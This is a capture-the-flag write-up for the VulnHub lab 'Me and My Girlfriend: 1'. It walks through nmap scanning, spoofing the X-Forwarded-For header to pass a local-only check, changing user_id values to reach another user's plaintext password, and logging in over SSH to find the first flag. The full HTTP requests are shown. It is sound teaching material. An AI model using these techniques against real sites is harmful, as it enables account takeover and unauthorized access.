# Me and My Girlfriend: 1
* URL: https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/
* Date release: 13 Dec 2019
* Author: [TW1C3](https://www.vulnhub.com/author/tw1c3,664/)
* Series: [Me and My Girlfriend](https://www.vulnhub.com/series/me-and-my-girlfriend,267/)

This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your help to get what Alice is hiding and get full access to the company!

* Difficulty Level: Beginner
* Notes: there are 2 flag files
* Learning: Web Application | Simple Privilege Escalation

# Footprinting
We need more information about the target by
starting with find out the ip address of the target by using Nmap

```console
nmap -F [ip address/mask]
```

The figure below shows the results:
<p align="center">
<img src="/meAndMyGf1/pic/target.png">
</p>

at this point, we can now use the web browser to access to target's web page. Follow by ***inspect element***. the result:

```html
Who are you? Hacker? Sorry This Site Can Only Be Accessed local!<!-- Maybe you can search how to use x-forwarded-for -->
```

As you can see, the creator of this CTF gave use a hint that we should use **x-forwarded-for** get the first flag

to find **more** information about the target

```console
nmap -A -sV -O [ip address] > meAndMyGf.txt
```
Where:
* -sV = Version scanning
* -A = Version scanning
* -O = OS detection

We also put the result from nmap in a file. This will help us to save some time since we do not need to run this command to get target's info again.

here is the result from runing the command above:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-31 13:24 EST
Nmap scan report for [ip address]
Host is up (0.00056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:0D:53:C5 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms [ip address]

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.42 seconds
```

The last line of the nmap output shows that it took 20 sec to finish the scanning. WOW is a lot, good that we save the output in a file. I think I should increasse the ram of my kali vm.

# Action
Fire up Burp Suit and get ready for some web application hacking! The hint was use **x-forwarded-for** to access to webserver.

according to [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) and [this](https://www.keycdn.com/support/x-forwarded-for)
X-Forwarded-For or XFF header is a de-facto standard header for identifying the **originating IP address**  of a (src ip) client connecting to a web server (our target) through an HTTP proxy or a load balancer.Our goal is spoofing src ip address so the web server think we try to access from local. 

At this point you can now guess, WE have to combine XFF and localhost.
Now try to visite the website when the brup suit is on and try to intercept the get request. Then add
```
X-Forwarded-For: 127.0.0.1
```
The request should look something like this
```
GET /?page=index HTTP/1.1
Host: [ip address]
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=03gbe8fmpkvdr31vaf2io6co62
Connection: close
Upgrade-Insecure-Requests: 1
```
When the webserver get our request, it will assume that the request was send from 127.0.0.1 (localhost). It then response with a legit webpage that was blocked before.
WOOP WOOP! we are in !!!
<p align="center">
<img src="/meAndMyGf1/pic/home.png">
</p>

NOW time to play around and learn how the application works. I poked around, tried to check every link I could. The most anoying part is, I needed to put x-fowared-for in each reaquest (```X-Forwarded-For: 127.0.0.1```). I then created a accout call, user: ```test``` pass ```1234```.
```
POST /misc/process.php?act=login HTTP/1.1
Host: 192.168.58.129
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.58.129/index.php?page=login
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close
Cookie: PHPSESSID=trb9hv9p2mckesqb3n40i1ur75
Upgrade-Insecure-Requests: 1

username=test&password=1234&submit=
```
The request above is the request I sent to the webserver when I tried to login to the website with created credential. As you can see in the body, ```username=test&password=1234&submit=``` contain my credential. The website then redirected to another page after the authentication. The figure below shows the http reqest that redirect me to dashboard page.

```
GET /index.php?page=dashboard&user_id=13 HTTP/1.1
Host: 192.168.58.129
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.58.129/index.php?page=login
Connection: close
Cookie: PHPSESSID=trb9hv9p2mckesqb3n40i1ur75
Upgrade-Insecure-Requests: 1
```
By studying the first line of the previous reqest ```GET /index.php?page=dashboard&user_id=13 HTTP/1.1``` I learn that, the request try to get information from the dashboard page and also pass ```user_id=13```. I assume that user_id = 13 is me, which is the credential that I created. 

There is only 3 link on the narv bar, Dashboard, Profile and Logout. I then try to check the profile, the picture below shows the profile page.

<p align="center">
<img src="/meAndMyGf1/pic/profile.png">
</p>

As you can see, It seem like we can change the user's credential on this page. The problem is the CHANGE button is disable, we can't click it. I then use the **Inspect Elements** to examing the webpage, I might be able to manipulate the HTML and make the button click able again.
```<button disabled="disabled">Change</button>```, here is the Change button. To disable it, remove ```disabled="disabled"``` from it which give me ```<button>Change</button>```. The picture below shows the result.

<p align="center">
<img src="/meAndMyGf1/pic/button.png">
</p>

I changed Name, Username and password then press the change button. **IT DIDN'T WORK**. The credential still stay the same as before. **GOD DAMN IT!!**. I then check the HTML on the profile page again. **OMG HOW DID I MISSED IT?**

```html
<form action="#" method="POST">
<label for="name">Name</label>
<input type="text" name="name" id="name" value="test"><br>
<label for="username">Username</label>
<input type="text" name="username" id="username" value="test"><br>
<label for="password">Password</label>
<input type="password" name="password" id="password" value="1234"><br>
<button disabled="disabled">Change</button>
```

Oh, look what I missed, stupid me. The password is already in ```value="1234"```. So now I know how to get the password. The last step is try to get to Alic profile and get her password!! As I mentioned before, ```user_id=13``` seem like my credential since ```user_id=13``` popup every time I click something. So let try to change to ```user_id=X``` where X = INT and try to find ALICE's credential.

FINALLY!! I found her ! my target, ALICE (```user_id=5```). 
<p align="center">
<img src="/meAndMyGf1/pic/alice.png">
</p>

Remember when I did nmap to scan the server? (scroll up if you dont remenber). Note that the **SSH** is open. I then user Alice's credential to login to the company machine by using **SSH** -> run  ```ssh alice@ipAddr``` . **MASHALLAH ! I'M IN**


To list all file in the directory run ```ls``` BUT there is nothing here. I then use ```ls -la``` or ```ls -a``` to list all file including the hidden file. OMG I FOUND IT, I FOUND HER SECRET!! Let me call BOB and keep him updated. The picture below shows the result.


To move inside the ***.my_secret*** directory run ```cd .my_secret``` follow by ```ls``` again to list all file. **I FOUND THE FIRST FLAG!!!** inside ***.my_secret*** there is two files, ***flag1.txt*** ***my_notes.txt*** which contain some bad stuff about bob... I should let him know about this. To view the file's content, run ```cat [file's name]```. The figure below shows files content.
